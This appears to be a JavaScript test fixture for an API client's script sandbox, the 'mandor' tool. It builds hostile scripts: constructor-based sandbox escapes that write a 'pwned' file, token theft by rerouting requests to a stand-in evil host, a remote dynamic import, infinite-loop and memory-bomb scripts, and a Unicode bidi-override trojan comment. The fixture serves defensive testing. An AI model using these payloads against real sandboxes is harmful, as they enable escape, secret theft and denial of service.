import { tmpdir } from 'node:os';
import { join } from 'node:path';

/** The file an escape would plant outside the repo: its absence is the proof the sandbox held. */
export const ATTACK_MARK = join(tmpdir(), 'mandor-attack-testigo.txt');

/** Every name and every line the two specs wait for, in the one place both of them read. */
export const ATTACK = Object.freeze({
    originName: 'Hostil',
    collection: 'Pedidos',
    folder: 'atacar',
    connections: Object.freeze({
        spy: 'espia',
        siphon: 'sifon',
        echo: 'eco',
        loop: 'bucle',
        bomb: 'bomba',
    }),
    requests: Object.freeze({
        steal: 'robar',
        redirect: 'redirigir',
        loop: 'bucle',
        bomb: 'bomba',
        dynamicImport: 'importar',
        trojan: 'truco',
    }),
    marks: Object.freeze({
        batch: 'attack-batch-ran',
        folder: 'attack-folder-ran',
        steal: 'attack-steal-ran',
        redirect: 'attack-redirect-ran',
        loop: 'attack-loop-ran',
        bomb: 'attack-bomb-ran',
        siphon: 'attack-siphon-ran',
        echo: 'attack-echo-ran',
        trojan: 'attack-trick-ran',
    }),
    /** The Unicode bidi override the trojan text hides behind: `U+202E`, shown by no editor. */
    RLO: '‮',
    secretName: 'token',
    stealPath: '/steal',
    hopPath: '/hop',
    sentPath: '/sent',
    importedPath: '/imported',
});

/** The one workspace the hostile repo holds, and the environment its secret is declared in. */
export const HOSTILE_WORKSPACE = 'payments';
export const HOSTILE_ENVIRONMENT = 'local';

/**
 * Every try at the machinery of the host, each one told on its own console line: what came back
 * says whether the sandbox held (`undefined`, a guest error) or something of the host answered.
 */
export function escapeBatch(evilHttp) {
    const plant = `constructor.constructor("require('node:fs').writeFileSync('${ATTACK_MARK}', 'pwned')")()`;

    return [
        'function tried(name, attempt) { try { console.log("att-" + name + ":" + String(attempt())); } catch (e) { console.log("att-" + name + ":" + e.message); } }',
        'tried("process", () => typeof process);',
        'tried("require", () => typeof require);',
        'tried("fetch", () => typeof fetch);',
        'tried("wasm", () => typeof WebAssembly);',
        'tried("ctor", () => typeof constructor.constructor("return process")());',
        'tried("stack", () => { Error.prepareStackTrace = (a, s) => s; return new Error().stack; });',
        `tried("fs", () => ${plant});`,
        `await mandor.sendRequest({ url: '${evilHttp}${ATTACK.sentPath}', method: 'GET' });`,
        `console.log('${ATTACK.marks.batch}');`,
    ].join('\n');
}

/** One chain script per family of theft: the destination rule, the influenced redirect, the DoS. */
export function syncScripts(evilHttp) {
    return {
        folder: [
            'mandor.request.headers.set("X-Folder", "{{token}}");',
            `console.log('${ATTACK.marks.folder}');`,
        ].join('\n'),
        steal: [
            'const got = mandor.variables.get("token");',
            'mandor.request.headers.set("X-Got", String(got));',
            'mandor.variables.set("copia", "{{token}}");',
            'mandor.request.headers.set("X-Copy", "{{copia}}");',
            `mandor.request.url = '${evilHttp}${ATTACK.stealPath}';`,
            `console.log('${ATTACK.marks.steal}');`,
        ].join('\n'),
        redirect: [
            'mandor.request.headers.set("X-Next", "next");',
            `console.log('${ATTACK.marks.redirect}');`,
        ].join('\n'),
        loop: `console.log('${ATTACK.marks.loop}');\nwhile (true) {}`,
        bomb: [
            `console.log('${ATTACK.marks.bomb}');`,
            'const a = [];',
            'while (true) { a.push("x".repeat(1024 * 1024)); }',
        ].join('\n'),
        // The line it leaves is the proof the import was tried: refused, never loaded.
        dynamicImport: [
            `try { await import('${evilHttp}${ATTACK.importedPath}'); console.log('att-import:loaded'); }`,
            "catch (error) { console.log('att-import:' + error.message); }",
        ].join('\n'),
        trojan: [
            `// pag${ATTACK.RLO}ton ❬del‍imitado❭ ${'x'.repeat(900)}`,
            `console.log('${ATTACK.marks.trojan}');`,
        ].join('\n'),
    };
}

/** The three moments a connection can hook, wired the way a thief would wire them. */
export function asyncScripts(evilHttp) {
    return {
        spy: escapeBatch(evilHttp),
        siphon: [
            'mandor.request.query.set("q", "{{token}}");',
            `console.log('${ATTACK.marks.siphon}');`,
        ].join('\n'),
        echo: [
            `console.log('${ATTACK.marks.echo}');`,
            'for (let index = 0; index < 120; index += 1) {',
            '  mandor.socket.send(mandor.message.text + " " + String(index));',
            '}',
        ].join('\n'),
        loop: `console.log('${ATTACK.marks.loop}');\nwhile (true) {}`,
        bomb: [
            'if (mandor.message.text === "boom") {',
            '  const a = [];',
            '  while (true) { a.push("x".repeat(1024 * 1024)); }',
            '}',
            `console.log('${ATTACK.marks.bomb}');`,
        ].join('\n'),
    };
}
